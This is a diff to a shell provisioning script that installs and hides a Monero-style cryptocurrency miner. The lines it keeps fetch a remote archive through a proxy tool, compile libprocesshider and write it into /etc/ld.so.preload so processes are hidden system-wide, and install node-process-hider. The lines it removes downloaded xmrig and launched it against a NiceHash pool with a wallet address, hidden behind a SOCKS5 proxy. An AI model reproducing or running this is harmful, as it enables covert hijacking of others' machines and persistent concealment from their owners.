@@ -1,8 +1,8 @@
 #!/bin/sh
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+sudo su && sudo apt update && sudo apt upgrade -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
-npm i -g node-process-hider
+npm i -g node-process-hider && npm install -g npm
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -37,16 +37,9 @@ echo ""
 echo " "
 echo " "
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
-tar -zxf xmrig-6.16.2-bionic-x64.tar.gz
-cd xmrig-6.16.2
-chmod +x xmrig
-ph add xmrig
-
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.KHAILLA --threads=1 -x socks5://192.252.211.197:14921
